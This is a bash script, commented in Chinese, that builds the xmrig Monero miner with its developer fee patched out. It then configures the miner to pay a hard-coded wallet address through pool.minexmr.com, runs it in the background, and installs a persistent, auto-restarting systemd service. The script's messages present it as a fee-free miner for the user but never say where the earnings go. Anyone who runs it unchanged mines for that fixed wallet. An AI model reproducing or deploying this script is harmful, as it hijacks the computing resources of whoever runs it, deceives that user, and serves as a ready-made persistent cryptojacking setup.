#!/bin/bash

## 这个脚本帮你安装挖矿程序
## author: qu5
## Github: https://github.com/qu5/wower

clear
echo -e "\n"
echo " wower可以帮你一步步编译安装0抽水xmrig挖矿程序，仅支持Debian和ubuntu！"
echo -e "\n"
echo "等待 8 秒将开始安装 (按 Ctrl+C 取消)"
sleep 8s

apt update
apt install curl sudo -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev git -y
cd ~
git clone https://github.com/xmrig/xmrig.git $HOME/wower/
sed -i 's/constexpr const int kDefaultDonateLevel = 1;/constexpr const int kDefaultDonateLevel = 0;/' $HOME/wower/src/donate.h
sed -i 's/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/' $HOME/wower/src/donate.h

echo "开始编译安装xmrig程序，请耐心等待"
mkdir wower/build && cd wower/build
cmake ..
make -j$(nproc)

cp $HOME/wower/src/config.json $HOME/wower/build/config.json


sed -i 's/"user": *"[^"]*",/"user": "'4982iVeQfyA4QaFJocmMNy3Kr7NMKfmTRFbdq3GLckXwDY3CyX14bZv6RK9qJYRXWGAz7cWVtyL2MBZSxScjC1sV5Q6N7RH'",/' $HOME/wower/build/config.json


sed -i 's/"url": *"[^"]*",/"url": "'pool.minexmr.com:4444'",/' $HOME/wower/build/config.json


sed -i 's/"pass": *"[^"]*",/"pass": "'Fsociety'",/' $HOME/wower/build/config.json

sed -i 's/"background": *false,/"background": true,/' $HOME/wower/build/config.json

echo "创建挖矿启动服务"
cat >/tmp/wower.service <<EOL
[Unit]
Description=wower service

[Service]
Type=forking
ExecStart=$HOME/wower/build/xmrig --config=$HOME/wower/build/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
sudo mv /tmp/wower.service /etc/systemd/system/wower.service
sudo killall xmrig 2>/dev/null
sudo systemctl daemon-reload
sudo systemctl enable wower
sudo systemctl start wower
echo "关闭wower挖矿：systemctl stop wower"
echo "重启wower挖矿：systemctl restart wower"
echo "安装完成，请稍后访问矿池查看结果"
